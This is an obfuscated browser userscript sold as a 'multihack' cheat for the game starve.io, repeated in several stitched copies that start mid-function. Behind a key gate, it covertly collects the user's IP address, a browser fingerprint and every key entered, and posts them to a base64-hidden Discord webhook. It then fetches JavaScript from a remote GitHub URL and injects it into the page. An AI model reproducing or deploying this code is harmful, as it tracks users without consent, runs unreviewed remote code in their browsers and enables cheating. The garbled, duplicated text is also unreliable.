                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
